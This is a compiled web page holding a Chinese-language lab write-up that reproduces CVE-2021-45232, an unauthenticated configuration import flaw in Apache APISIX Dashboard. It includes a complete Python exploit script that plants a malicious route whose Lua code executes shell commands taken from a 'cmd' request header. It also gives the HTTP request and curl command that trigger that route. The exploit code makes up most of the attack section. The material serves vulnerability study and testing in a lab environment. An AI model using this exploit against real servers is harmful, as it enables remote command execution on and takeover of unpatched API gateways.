import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const u={},l=n("p",null,"Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。",-1),r=n("p",null,[s("Apache APISIX Dashboard 2.10.1版本前存在两个API"),n("code",null,"/apisix/admin/migrate/export"),s("和"),n("code",null,"/apisix/admin/migrate/import"),s("，他们没有经过"),n("code",null,"droplet"),s("框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。")],-1),d=n("p",null,"参考链接：",-1),k={href:"https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/wuppp/cve-2021-45232-exp",target:"_blank",rel:"noopener noreferrer"},m=p(`<h2 id="漏洞环境" tabindex="-1"><a class="header-anchor" href="#漏洞环境" aria-hidden="true">#</a> 漏洞环境</h2><p>Vulhub执行如下命令启动一个有漏洞的Apache APISIX Dashboard 2.9：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后访问<code>http://your-ip:9000/</code>即可看到Apache APISIX Dashboard的登录页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210110923738.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>两个Apache APISIX Dashboard提供的未授权API，我们可以简单地导入一个恶意配置文件，其中包含我们构造的LUA脚本：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210110927989.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,8),b={href:"https://github.com/wuppp/cve-2021-45232-exp",target:"_blank",rel:"noopener noreferrer"},g=p(`<p><strong>apisix_dashboard_rce.py</strong></p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> zlib
<span class="token keyword">import</span> json
<span class="token keyword">import</span> random
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning

<span class="token comment"># Suppress only the single warning from urllib3 needed.</span>
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>category<span class="token operator">=</span>InsecureRequestWarning<span class="token punctuation">)</span>


eval_config <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;Counsumers&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Routes&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">100000000000000000</span><span class="token punctuation">,</span> <span class="token number">1000000000000000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&quot;create_time&quot;</span><span class="token punctuation">:</span> <span class="token number">1640674554</span><span class="token punctuation">,</span>
            <span class="token string">&quot;update_time&quot;</span><span class="token punctuation">:</span> <span class="token number">1640677637</span><span class="token punctuation">,</span>
            <span class="token string">&quot;uris&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
                <span class="token string">&quot;/rce&quot;</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;rce&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;methods&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
                <span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;PUT&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;DELETE&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;PATCH&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;HEAD&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;OPTIONS&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;CONNECT&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;TRACE&quot;</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;script&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;local file = io.popen(ngx.req.get_headers()[&#39;cmd&#39;],&#39;r&#39;) \\n local output = file:read(&#39;*all&#39;) \\n file:close() \\n ngx.say(output)&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;status&quot;</span><span class="token punctuation">:</span> <span class="token number">1</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Services&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;SSLs&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Upstreams&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;Scripts&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;GlobalPlugins&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&quot;PluginConfigs&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">calc_crc</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    crc32 <span class="token operator">=</span> zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
    <span class="token keyword">return</span> crc32<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">&quot;big&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">export_data</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;/apisix/admin/migrate/export&quot;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">import_data</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    crc32 <span class="token operator">=</span> calc_crc<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;file&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">&quot;data&quot;</span><span class="token punctuation">,</span> data <span class="token operator">+</span> crc32<span class="token punctuation">,</span> <span class="token string">&quot;text/data&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;/apisix/admin/migrate/import&quot;</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token comment"># print(resp.text)</span>
    <span class="token keyword">if</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;code&quot;</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;python &quot;</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&quot; http://127.0.0.1:9000&quot;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

    uri <span class="token operator">=</span> random_str<span class="token punctuation">(</span><span class="token punctuation">)</span>
    eval_config<span class="token punctuation">[</span><span class="token string">&quot;Routes&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&quot;uris&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">&quot;/&quot;</span> <span class="token operator">+</span> uri<span class="token punctuation">]</span>
    eval_config<span class="token punctuation">[</span><span class="token string">&quot;Routes&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> uri

    <span class="token keyword">if</span> import_data<span class="token punctuation">(</span>url<span class="token punctuation">,</span> eval_config<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;attack success&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;uri is: &quot;</span> <span class="token operator">+</span> <span class="token string">&quot;/&quot;</span> <span class="token operator">+</span> uri<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;attack error&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210111058704.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>添加完恶意路由后，你需要访问Apache APISIX中对应的路径来触发前面添加的脚本。值得注意的是，Apache APISIX和Apache APISIX Dashboard是两个不同的服务，Apache APISIX Dashboard只是一个管理页面，而添加的路由是位于Apache APISIX中，所以需要找到Apache APISIX监听的端口或域名。</p><p>在当前环境下，Apache APISIX监听在9080端口下。我们发送数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /LQsRF0 HTTP/1.1
Host: your-ip:9080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Connection: close
CMD: id
Cache-Control: max-age=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210111059770.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>也可以通过之前的POC实现命令执行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:9080/LQsRF0 -H &quot;cmd: id&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210111058564.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，我们在Header中添加的<code>CMD</code>头中的命令已被执行。</p><p>这个漏洞是Apache APISIX Dashboard的漏洞，而Apache APISIX无需配置IP白名单或管理API，只要二者连通同一个etcd即可。</p>`,12);function q(h,f){const a=o("ExternalLinkIcon");return c(),i("div",null,[l,r,d,n("ul",null,[n("li",null,[n("a",k,[s("https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/"),t(a)])]),n("li",null,[n("a",v,[s("https://github.com/wuppp/cve-2021-45232-exp"),t(a)])])]),m,n("p",null,[s("注意的是，这个配置文件的最后4个字符是当前文件的CRC校验码，所以最好通过自动化工具来生成和发送这个利用数据包，比如"),n("a",b,[s("这个POC"),t(a)]),s("。")]),g])}const x=e(u,[["render",q],["__file","Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232.html.vue"]]);export{x as default};
